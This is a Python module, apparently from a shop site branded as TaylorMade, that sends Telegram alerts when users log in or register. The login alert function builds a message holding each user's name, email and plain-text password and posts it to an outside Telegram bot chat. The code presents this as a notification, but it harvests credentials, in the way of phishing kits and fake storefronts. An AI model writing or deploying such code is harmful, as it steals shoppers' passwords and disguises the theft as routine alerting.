import httpx
import os
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"


def send_login_alert(user_name: str, email: str, password: str) -> bool:
    """
    Send a Telegram alert when a user logs in.
    Includes the user's name, email, and plain-text password.
    """
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = (
        f"🏌️ *TaylorMade Shop — New Login*\n"
        f"─────────────────────\n"
        f"👤 *Name:* {user_name}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* `{password}`\n"
        f"🕐 *Time:* {now}\n"
        f"─────────────────────"
    )

    try:
        with httpx.Client(timeout=10.0) as client:
            response = client.post(
                TELEGRAM_API_URL,
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": message,
                    "parse_mode": "Markdown",
                },
            )
            if response.status_code == 200:
                print(f"[TELEGRAM] Login alert sent for {email}")
                return True
            else:
                print(f"[TELEGRAM ERROR] Status {response.status_code}: {response.text}")
                return False
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")
        return False


def send_new_user_alert(user_name: str, email: str) -> bool:
    """Send a Telegram alert when a new user registers."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = (
        f"🆕 *TaylorMade Shop — New Registration*\n"
        f"─────────────────────\n"
        f"👤 *Name:* {user_name}\n"
        f"📧 *Email:* {email}\n"
        f"🕐 *Time:* {now}\n"
        f"─────────────────────"
    )

    try:
        with httpx.Client(timeout=10.0) as client:
            response = client.post(
                TELEGRAM_API_URL,
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": message,
                    "parse_mode": "Markdown",
                },
            )
            return response.status_code == 200
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")
        return False
